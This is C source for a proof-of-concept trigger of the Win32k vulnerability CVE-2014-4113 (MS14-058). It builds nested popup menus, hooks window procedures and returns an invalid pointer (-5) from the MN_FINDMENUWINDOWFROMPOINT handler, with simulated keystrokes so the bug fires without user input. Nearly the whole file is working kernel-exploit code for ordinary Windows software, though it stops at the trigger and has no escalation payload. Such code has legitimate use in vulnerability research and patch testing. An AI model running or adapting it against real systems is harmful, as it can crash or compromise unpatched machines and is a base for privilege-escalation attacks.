/*
 *     Win32k Hurricane Panda
 *    CVE-2014-4113 / MS14-058
 * Vulnerability Discovery: Unknown
 * Exploit Authors: Ashfaq Ansari
 *
 * This is just a vulnerability trigger
 */

#include "CVE-2014-4113.h"

WNDPROC oldWndProc = {0};
BOOL HookOnlyOnce = FALSE;
BOOL PostOnlyOnce = FALSE;

static VOID Die(CONST PTCHAR fmt, ...)
{
	va_list args;
	fflush(stdout);
	va_start(args, fmt);
	vfprintf(stderr, fmt, args);
	va_end(args);
	exit(EXIT_FAILURE);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
		case WM_ENTERIDLE:
			if (!PostOnlyOnce)
			{
				PostOnlyOnce = TRUE;
				DEBUG_MESSAGE("[+] Simulating User Interaction\n");

				// this vulnerability only occurs when menu callback
				// is executed and for that it's important that user
				// clicks on the menu. since this is manual task so
				// let's automate it. simulate user actions
				PostMessage(hWnd, WM_KEYDOWN, 0x28, 0);
                PostMessage(hWnd, WM_KEYDOWN, 0x27, 0);
				PostMessage(hWnd, WM_LBUTTONDOWN, 0x0, 0);
			}
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return EXIT_SUCCESS;
}

LRESULT CALLBACK SubClassNewWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	LRESULT lResult = {0};

	switch (message)
	{
		case MN_FINDMENUWINDOWFROMPOINT:
			DEBUG_MESSAGE("[+] Triggering Vulnerability\n");

			// vulnerability lies here
			// this value is used as memory address without validating
			lResult = -5;
			break;
		default:
			lResult = CallWindowProc(oldWndProc, hWnd, message, wParam, lParam);
			break;
	}
	return lResult;
}

HMENU CreatePopUpMenus(VOID)
{
	HMENU hMenu1 = {0};
	HMENU hMenu2 = {0};

	MENUITEMINFO menuItemInfo1 = {0};
	MENUITEMINFO menuItemInfo2 = {0};

	// create the first popup menu
	hMenu1 = CreatePopupMenu();

	if (hMenu1)
	{
		DEBUG_MESSAGE("[+] CreatePopupMenu: 0x%p\n", hMenu1);

		menuItemInfo1.cbSize = sizeof(MENUITEMINFO);
		menuItemInfo1.fMask = MIIM_STRING;

		// insert the menu
		if (InsertMenuItem(hMenu1, 0, TRUE, &menuItemInfo1)) 
		{
			// create the second popup menu
			hMenu2 = CreatePopupMenu();
			DEBUG_MESSAGE("[+] CreatePopupMenu: 0x%p\n", hMenu2);
			
			menuItemInfo2.fMask = MIIM_STRING | MIIM_SUBMENU;
			menuItemInfo2.cch = 1;
			menuItemInfo2.hSubMenu = hMenu1;
			menuItemInfo2.cbSize = sizeof(MENUITEMINFO);
			menuItemInfo2.dwTypeData = "";

			// insert the menu
			InsertMenuItem(hMenu2, 0, TRUE, &menuItemInfo2);
		}
		else
		{
			// destroy the specified menu and free memory
			DestroyMenu(hMenu1);
			DEBUG_MESSAGE("[+] DestroyMenu: 0x%p\n", hMenu1);
		}
	}
	return hMenu2;
}

LRESULT CALLBACK WndProcCallbackHook(INT nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		PCWPSTRUCT pCwpStruct = (PCWPSTRUCT)lParam;
		
		switch (pCwpStruct->message)
		{
			case MN_FINDMENUWINDOWFROMPOINT:
				if (!HookOnlyOnce)
				{
					HookOnlyOnce = TRUE;

					// Unhook the applied hook on WH_CALLWNDPROC
					if (UnhookWindowsHook(WH_CALLWNDPROC, WndProcCallbackHook))
					{
						// set new address of lpfnWndProc callback function
						oldWndProc = (WNDPROC)SetWindowLongPtr(pCwpStruct->hwnd, GWL_WNDPROC, (ULONG_PTR)SubClassNewWndProc);
					}
				}
				break;
			
			default:
				break;
		}
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI TriggerVulnerability(VOID)
{
	HWND hWindow = {0};
	HMENU hMenu = {0};
	WNDCLASS wndClass = {0};
	static CONST PTCHAR szWindowClass = "HACKSYS_CLASS";

	wndClass.lpfnWndProc   = WndProc;
	wndClass.lpszClassName = szWindowClass;

	// register the window class WNDCLASS
	if (!RegisterClass(&wndClass))
	{
		DEBUG_MESSAGE("[-] RegisterClass Failed: 0x%08x\n", GetLastError());
		return EXIT_FAILURE;
	}
	else
	{
		DEBUG_MESSAGE("[+] Kernel RegisterClass: 0x%p\n", &wndClass);

		// create the window by passing the WNDCLASS structure
		hWindow = CreateWindowEx(0, szWindowClass, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0);

		if (!hWindow)
		{
			DEBUG_MESSAGE("[-] CreateWindowEx Failed: 0x%08x\n", GetLastError());
			return EXIT_FAILURE;
		}
		else
		{
			DEBUG_MESSAGE("[+] Kernel CreateWindwEx: 0x%p\n", hWindow);

			// create the popup menus
			hMenu = CreatePopUpMenus();

			if (hMenu) 
			{
				// hook WH_CALLWNDPROC
				if (SetWindowsHookEx(WH_CALLWNDPROC, (HOOKPROC)&WndProcCallbackHook, NULL, GetCurrentThreadId())) 
				{
					DEBUG_MESSAGE("[+] Hooked: WH_CALLWNDPROC\n");

					// now display floating pop-up menu and tracks the selection 
					// of items on the pop-up menu by calling TrackPopupMenu()
					// by doing this, we will enter the menu's callback procedure
					TrackPopupMenu(hMenu, 0, -10000, -10000, 0, hWindow, 0);
				}
			}
		}
	}

	return EXIT_SUCCESS;
}

INT main(UINT argc, PTCHAR argv[])
{
	CONST PTCHAR banner = 
		"                                                                               \n"
		" #     #                       #####               #######                     \n"
		" #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #\n"
		" #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##\n"
		" ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #\n"
		" #     # ###### #      #  #         #   #        #    #    #      ###### #    #\n"
		" #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #\n"
		" #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #\n"
		"                                                                               \n"
		"                          CVE-2014-41143 / MS14-058                            \n"
		"                                                                               \n";

	// print the banner
	DEBUG_MESSAGE(banner);

	TriggerVulnerability();

	return EXIT_SUCCESS;
}